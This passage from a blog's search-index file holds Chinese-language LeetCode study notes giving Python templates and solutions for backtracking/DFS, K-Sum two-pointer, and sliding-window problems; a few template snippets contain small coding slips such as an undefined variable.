处理左数组</span></span><br><span class="line">            sort(nums, mid+<span class="number">1</span>, high) 	<span class="comment"># 处理右数组</span></span><br><span class="line">            merge(nums, low, mid, high) <span class="comment"># 合并左右两个数组</span></span><br><span class="line">        </span><br><span class="line">        sort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums)-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums[-k]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记3 - 回溯类问题（DFS）解题模板</title>
    <url>/2024/03/14/leetcode-backtrace/</url>
    <content><![CDATA[<h1 id="Leetcode笔记3-回溯类问题-DFS"><a href="#Leetcode笔记3-回溯类问题-DFS" class="headerlink" title="Leetcode笔记3 - 回溯类问题-DFS"></a>Leetcode笔记3 - 回溯类问题-DFS</h1><h2 id="1-回溯类问题"><a href="#1-回溯类问题" class="headerlink" title="1. 回溯类问题"></a>1. 回溯类问题</h2><p>每次刷题刷完了不久就会忘记DFS的很多细节。。直到看到了东哥的<a href="https://mp.weixin.qq.com/s/nMUHqvwzG2LmWA9jMIHwQQ">回溯算法详解</a>，才从根上理解了这一类算法的底层原理。</p>
<p>对于我这种看到算法就头疼的选手，还真得靠这种大佬帮忙梳理总结底层原理才行。。</p>
<p><strong>核心框架 &amp;&amp; 解题模板</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 定义：</span></span><br><span class="line"><span class="comment">#1、路径：当前已经做过的所有选择</span></span><br><span class="line"><span class="comment">#2、选择列表：当前结点可以做的选择</span></span><br><span class="line"><span class="comment">#3、结束条件：即到达决策树底层，无法再做选择的条件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 核心框架</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">路径，选择列表</span>)：</span><br><span class="line">	<span class="keyword">if</span> 满足结束条件：</span><br><span class="line">    	<span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">        <span class="comment">#做选择</span></span><br><span class="line">        backtrace()</span><br><span class="line">        <span class="comment">#撤销选择</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> 选择 <span class="keyword">in</span> 选择列表：</span><br><span class="line">	<span class="comment"># 做选择</span></span><br><span class="line">    选择列表.remove(当前选择)</span><br><span class="line">    路径.add(当前选择)</span><br><span class="line">    <span class="comment"># 回溯</span></span><br><span class="line">    backtrace(路径，选择列表)</span><br><span class="line">    <span class="comment"># 撤销选择</span></span><br><span class="line">    路径.remove(当前选择)</span><br><span class="line">    选择列表.add(当前选择)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="49-子集"><a href="#49-子集" class="headerlink" title="49. 子集"></a><a href="https://leetcode.cn/problems/subsets/">49. 子集</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[],[1],[2],[1,2],[3],[1,3],[2,3],[1,2,3]]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 按照回溯的思想，有前序和后序两种方式</span></span><br><span class="line"><span class="comment">## 1、如果是前序执行，则路径的记录顺序应该为:</span></span><br><span class="line"><span class="comment">## [],[1],[1,2],[1,2,3],(从这里开始回撤)[1,3],(再次回撤)[2],[2,3],(再次回撤)[3]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            res.append(track[:]) <span class="comment"># 把当前路径记录到最终结果里</span></span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="comment">## 注意，这里的nums就是我们可以做出选择的选择列表;</span></span><br><span class="line">            <span class="comment">## 且这里的隐藏结束条件是for循环到头</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)): </span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 回撤</span></span><br><span class="line">                track.pop()</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    </span><br><span class="line"><span class="comment">## 2、也可以后序执行，则路径的记录顺序为：</span></span><br><span class="line"><span class="comment">## [1,2,3],[1,2],(这里开始有个回撤)[1,3],(再次回撤)[1],(再次回撤)[2,3],(再次回撤)[2],(再次回撤)[3],(自己补一个)[]</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">subsets</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = [] <span class="comment"># 记录最终结果</span></span><br><span class="line">        track = [] <span class="comment"># 维护当前路径</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums, start</span>):</span><br><span class="line">            <span class="comment">## 模板</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(start, <span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums, i+<span class="number">1</span>)</span><br><span class="line">                <span class="comment">## 撤回选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">            res.append(track[:])</span><br><span class="line">        backtrace(nums, <span class="number">0</span>)</span><br><span class="line">        res.append([])</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46. 全排列"></a><a href="https://leetcode.cn/problems/permutations/description/">46. 全排列</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [1,2,3]</span></span><br><span class="line"><span class="comment"># 输出：[[1,2,3],[1,3,2],[2,1,3],[2,3,1],[3,1,2],[3,2,1]]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">permute</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        res = []</span><br><span class="line">        track = []</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">nums</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(track) == <span class="built_in">len</span>(nums):</span><br><span class="line">                res.append(track[:])</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i] <span class="keyword">in</span> track: <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">## 做选择</span></span><br><span class="line">                track.append(nums[i])</span><br><span class="line">                <span class="comment">## 回溯</span></span><br><span class="line">                backtrace(nums)</span><br><span class="line">                <span class="comment">## 撤销选择</span></span><br><span class="line">                track.pop()</span><br><span class="line">                </span><br><span class="line">        backtrace(nums)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h3><p>此题同样可以通过动态规划求解，因为我们发现对于n组’()’，在’()’的不同位置，添加任意’()’，即可得到n+1的解。又即，dp(n)依赖于dp(n-1)。详细解法见动态规划类解题模板。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数字 n 代表生成括号的对数，请你设计一个函数，用于能够生成所有可能的并且 有效的 括号组合。</span></span><br><span class="line"><span class="comment"># 示例 1：</span></span><br><span class="line"><span class="comment"># 输入：n = 3</span></span><br><span class="line"><span class="comment"># 输出：[&quot;((()))&quot;,&quot;(()())&quot;,&quot;(())()&quot;,&quot;()(())&quot;,&quot;()()()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例 2：</span></span><br><span class="line"><span class="comment"># 输入：n = 1</span></span><br><span class="line"><span class="comment"># 输出：[&quot;()&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generateParenthesis</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">str</span>]:</span><br><span class="line">        track = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">n, left, right, track</span>):</span><br><span class="line">            <span class="keyword">if</span> left &gt; n <span class="keyword">or</span> right &gt; left:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> left == right == n:</span><br><span class="line">                res.append(track)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">for</span> choice <span class="keyword">in</span> [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>]: <span class="comment">## 注意，我们的选择其实只有&#x27;(&#x27;和&#x27;)&#x27;两个，我们的base case取决于&#x27;(&#x27;和&#x27;)&#x27;的数量</span></span><br><span class="line">                <span class="keyword">if</span> choice == <span class="string">&#x27;(&#x27;</span>: left += <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right += <span class="number">1</span></span><br><span class="line">                track += choice</span><br><span class="line">                backtrace(n, left, right, track)</span><br><span class="line">                <span class="keyword">if</span> track[-<span class="number">1</span>] == <span class="string">&#x27;(&#x27;</span>: left -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>: right -= <span class="number">1</span></span><br><span class="line">                track = track[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">        backtrace(n, <span class="number">0</span>, <span class="number">0</span>, track)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>



<h2 id="2-DFS类问题"><a href="#2-DFS类问题" class="headerlink" title="2. DFS类问题"></a>2. DFS类问题</h2><h3 id="226-翻转二叉树"><a href="#226-翻转二叉树" class="headerlink" title="226. 翻转二叉树"></a><a href="https://leetcode.cn/problems/invert-binary-tree/">226. 翻转二叉树</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [4,2,7,1,3,6,9]</span></span><br><span class="line"><span class="comment"># 输出：[4,7,2,9,6,3,1]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invertTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="type">Optional</span>[TreeNode]:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            root.left, root.right = root.right, root.left</span><br><span class="line">            dfs(root.left)</span><br><span class="line">            dfs(root.right)</span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> root</span><br></pre></td></tr></table></figure>



<h3 id="543-二叉树的直径"><a href="#543-二叉树的直径" class="headerlink" title="543. 二叉树的直径"></a><a href="https://leetcode.cn/problems/diameter-of-binary-tree/">543. 二叉树的直径</a></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：root = [1,2,3,4,5]</span></span><br><span class="line"><span class="comment"># 输出：3</span></span><br><span class="line"><span class="comment"># 解释：3 ，取路径 [4,2,1,3] 或 [5,2,1,3] 的长度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">diameterOfBinaryTree</span>(<span class="params">self, root: <span class="type">Optional</span>[TreeNode]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        self.d = <span class="number">0</span>  <span class="comment"># 记录最终结果</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">dfs</span>(<span class="params">root</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> root:</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">            left = dfs(root.left)</span><br><span class="line">            right = dfs(root.right)</span><br><span class="line">            self.d = <span class="built_in">max</span>(self.d, left + right)</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">max</span>(left, right) + <span class="number">1</span>   <span class="comment"># 要维护的是当前结点的最长子路径，回撤操作+1</span></span><br><span class="line">        dfs(root)</span><br><span class="line">        <span class="keyword">return</span> self.d</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记2 - K-Sum类问题解题模板</title>
    <url>/2024/03/13/leetcode-ksum/</url>
    <content><![CDATA[<h1 id="Leetcode笔记2-K-Sum"><a href="#Leetcode笔记2-K-Sum" class="headerlink" title="Leetcode笔记2 - K-Sum"></a>Leetcode笔记2 - K-Sum</h1><p>K-Sum类问题是指给你一个数组，让你从中挑选出K个数字满足和为N。</p>
<p>K-Sum类的核心思想是 2Sum，然后套娃就行了。因此此类问题的关键点在于<strong>2Sum</strong>的实现。</p>
<p><strong>核心思路</strong>：</p>
<p>​	1、<strong>数组排序</strong></p>
<p>​	2、<strong>双指针</strong>：头尾相向移动，遇到相同的数字跳过</p>
<p>​	3、<strong>防止重复值</strong>：每个最外层的遍历都需要防止重复值，以及对于遍历数组的边界值的处理</p>
<p><strong>套路模板：</strong></p>
<p>实现(K-1)-Sum，以3Sum为例，首先要实现2Sum：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2-Sum可直接默写</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">nums, start, target</span>):</span><br><span class="line">    res = []</span><br><span class="line">    low, high = start, <span class="built_in">len</span>(nums)-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        sum_ = nums[low] + nums[high]</span><br><span class="line">        <span class="keyword">if</span> sum_ &lt; target:</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            <span class="comment"># 指针一定要注意，因为前面已经low += 1了</span></span><br><span class="line">            <span class="comment"># 所以现在的nums[low]一定要和nums[low-1]去比较</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span> </span><br><span class="line">        <span class="keyword">elif</span> sum_ &gt; target:</span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="comment"># nums[high]同理</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append([nums[low], nums[high]])</span><br><span class="line">            low += <span class="number">1</span></span><br><span class="line">            high -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3-Sum 主要是要注意边界值的问题 和 要防止有重复值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">nums, target</span>):</span><br><span class="line">    nums.sort()</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nums[i]-<span class="number">2</span>): <span class="comment">## 注意边界值为K-1</span></span><br><span class="line">        <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span> <span class="comment">## 因为是升序排列，可提高效率</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span> <span class="comment">## 防止有重复值</span></span><br><span class="line">        <span class="comment">## 调用2Sum</span></span><br><span class="line">        target_ = target - nums[i]</span><br><span class="line">        tuples = twoSum(nums, i+<span class="number">1</span>, target_)</span><br><span class="line">        <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">            tup.append(nums[i])</span><br><span class="line">            res.append(tip)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">        </span><br></pre></td></tr></table></figure>



<h2 id="15-三数之和"><a href="#15-三数之和" class="headerlink" title="15. 三数之和"></a><a href="https://leetcode.cn/problems/3sum/">15. 三数之和</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums, start, target</span>):</span><br><span class="line">        res = []</span><br><span class="line">        low = start</span><br><span class="line">        high = <span class="built_in">len</span>(nums) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            sum_ = nums[low] + nums[high]</span><br><span class="line">            <span class="keyword">if</span> sum_ &gt; target:</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high = high -<span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> sum_ &lt; target:</span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                res.append([nums[low], nums[high]])</span><br><span class="line">                high -= <span class="number">1</span></span><br><span class="line">                low += <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[high] == nums[high+<span class="number">1</span>]: high -= <span class="number">1</span></span><br><span class="line">                <span class="keyword">while</span> low &lt; high <span class="keyword">and</span> nums[low] == nums[low-<span class="number">1</span>]: low += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">threeSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="type">List</span>[<span class="built_in">int</span>]]:</span><br><span class="line">        nums.sort()</span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)-<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> nums[i] &gt; <span class="number">0</span>: <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> i &gt; <span class="number">0</span> <span class="keyword">and</span> nums[i] == nums[i-<span class="number">1</span>]: <span class="keyword">continue</span></span><br><span class="line">            tuples = self.twoSum(nums, i+<span class="number">1</span>, -nums[i])</span><br><span class="line">            <span class="keyword">for</span> tup <span class="keyword">in</span> tuples:</span><br><span class="line">                tup.append(nums[i])</span><br><span class="line">                res.append(tup)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>

<h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1. 两数之和"></a><a href="https://leetcode.cn/problems/two-sum/description/">1. 两数之和</a></h2><p>这里有个小技巧：<strong>给定一个数组，当我们每次需要移动一个指针，然后遍历扫描该指针后面的数组元素的时候，其实可以用哈希表来降低算法复杂度 —— 仅需要扫一遍即可</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 输入：nums = [2,7,11,15], target = 9</span></span><br><span class="line"><span class="comment"># 输出：[0,1]</span></span><br><span class="line"><span class="comment"># 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, num <span class="keyword">in</span> <span class="built_in">enumerate</span>(nums):</span><br><span class="line">            <span class="keyword">if</span> target - num <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [hashtable[target-num], i]</span><br><span class="line">            hashtable[nums[i]] = i <span class="comment"># 每次在最后往哈希表里更新即可</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Leetcode笔记1 - 滑动窗口解题模板</title>
    <url>/2024/03/12/leetcode-sliding-window/</url>
    <content><![CDATA[<p>因为工作关系，coding不常用到算法，每次面试&#x2F;工作中遇到都要回忆好久。因此特意总结一些常见leetcode算法的解题模板，面试&#x2F;工作中遇到一些类似的问题可以节省很多回忆的时间。</p>
<p><strong>模板并不是所有问题的最优解，对于不同类型的问题，时间&#x2F;空间复杂度都要分别再行思考，往往会有更加精巧的解法。</strong></p>
<h1 id="Leetcode笔记1-滑动窗口"><a href="#Leetcode笔记1-滑动窗口" class="headerlink" title="Leetcode笔记1 - 滑动窗口"></a>Leetcode笔记1 - 滑动窗口</h1><p><strong>核心思路：</strong></p>
<p>​	1、<strong>扩大窗口</strong>：移动右指针，直至达到特定要求（初始最优值）的时候</p>
<p>​	2、<strong>收缩窗口</strong>：记录当前最优值，并移动左指针，直至满足扩大窗口的要求</p>
<p><strong>套路模板</strong>：</p>
<p>​	双重循环：<strong>外层循环移动右指针</strong>，<strong>里层循环移动左指针</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">left, right = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    <span class="keyword">while</span> window needs shirnk: <span class="comment">## 当达到当前最优值时，收缩窗口，右移左指针 </span></span><br><span class="line">    	<span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">        keep.remove(s[left])</span><br><span class="line">        left += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">## 一轮结束，开始新一轮扩大窗口</span></span><br><span class="line">    <span class="comment">## 处理一些窗口相关的数据</span></span><br><span class="line">    keep.add(s[right])</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h2 id="3-无重复字符的最长子串"><a href="#3-无重复字符的最长子串" class="headerlink" title="3. 无重复字符的最长子串"></a><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给定一个字符串 s ，请你找出其中不含有重复字符的最长子串的长度。</span></span><br><span class="line"><span class="comment"># 输入: s = &quot;abcabcbb&quot;</span></span><br><span class="line"><span class="comment"># 输出: 3 </span></span><br><span class="line"><span class="comment"># 解释: 因为无重复字符的最长子串是 &quot;abc&quot;，所以其长度为 3。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        keep = <span class="built_in">set</span>()</span><br><span class="line">        left, cur_len, max_len, n = <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            cur_len += <span class="number">1</span>	<span class="comment">## 处理一些窗口相关的数据：记录当前字符串长度</span></span><br><span class="line">            <span class="keyword">while</span> s[right] <span class="keyword">in</span> keep: <span class="comment">## 当遇到重复字符时，收缩窗口，右移左指针</span></span><br><span class="line">                <span class="comment">## 处理一些窗口相关的数据：</span></span><br><span class="line">                <span class="comment">## 右移左指针（之前要先删掉窗口里的元素）</span></span><br><span class="line">                <span class="comment">## 当前长度 - 1</span></span><br><span class="line">                keep.remove(s[left]) </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">                cur_len -= <span class="number">1</span></span><br><span class="line">            <span class="comment">## 一轮结束，需要维护最大长度值，并且增加窗口元素</span></span><br><span class="line">            max_len = <span class="built_in">max</span>(max_len, cur_len)</span><br><span class="line">            keep.add(s[right])</span><br><span class="line">        <span class="keyword">return</span> max_len</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="209-长度的最小子数组"><a href="#209-长度的最小子数组" class="headerlink" title="209. 长度的最小子数组"></a><a href="https://leetcode.cn/problems/minimum-size-subarray-sum/">209. 长度的最小子数组</a></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 给定一个含有 n 个正整数的数组和一个正整数 target。找出该数组中满足其总和大于等于 target 的长度最小的 连续子数组[numsl, numsl+1, ..., numsr-1, numsr] ，并返回其长度。如果不存在符合条件的子数组，返回 0 。</span></span><br><span class="line"><span class="comment"># 输入：target = 7, nums = [2,3,1,2,4,3]</span></span><br><span class="line"><span class="comment"># 输出：2</span></span><br><span class="line"><span class="comment"># 解释：子数组 [4,3] 是该条件下的长度最小的子数组。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">minSubArrayLen</span>(<span class="params">self, target: <span class="built_in">int</span>, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        left, n = <span class="number">0</span>, <span class="built_in">len</span>(nums)</span><br><span class="line">        min_len = n + <span class="number">1</span></span><br><span class="line">        sum_ = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> right <span class="keyword">in</span> <span class="built_in">range</span>(n): <span class="comment">## 扩大窗口，右移右指针</span></span><br><span class="line">            sum_ += nums[right] <span class="comment">## 求窗口的和</span></span><br><span class="line">            <span class="keyword">while</span> sum_ &gt;= target: <span class="comment">## 当和大于等于target时，收缩窗口，右移左指针</span></span><br><span class="line">                min_len = <span class="built_in">min</span>(min_len, right + <span class="number">1</span> - left) <span class="comment">## 记录最小的窗口长度</span></span><br><span class="line">                <span class="comment">## 右移左指针，当前长度-1</span></span><br><span class="line">                sum_ -= nums[left] </span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> min_len == n + <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> min_len</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Leetcode算法笔记</category>
      </categories>
      <tags>
        <tag>Leetcode算法笔记</tag>
      </tags>
  </entry>
</search>
